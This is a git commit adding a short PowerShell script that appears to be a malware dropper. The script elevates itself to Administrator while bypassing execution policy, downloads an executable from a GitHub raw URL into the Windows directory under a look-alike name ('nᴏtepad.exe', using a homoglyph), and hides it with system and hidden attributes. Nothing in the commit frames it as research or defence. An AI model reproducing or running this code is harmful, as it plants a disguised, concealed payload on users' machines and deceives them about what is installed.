c83968d19b3c73ea9666dffba314ca1c8e5d039e
startwithzero <82289539+n0roffbrain@users.noreply.github.com>
2025-12-21 17:28:37 +0100

    Add files via upload

---
+++ NotewMSysPr9.ps1
@@ -0,0 +1,13 @@
+﻿if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "ADMIN..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$system32Path = "$env:windir"
+$exeDestination = Join-Path $system32Path "nᴏtepad.exe"
+
+$exeUrl = "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/CMF35.exe"
+Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+
+attrib +s +h "$exeDestination"
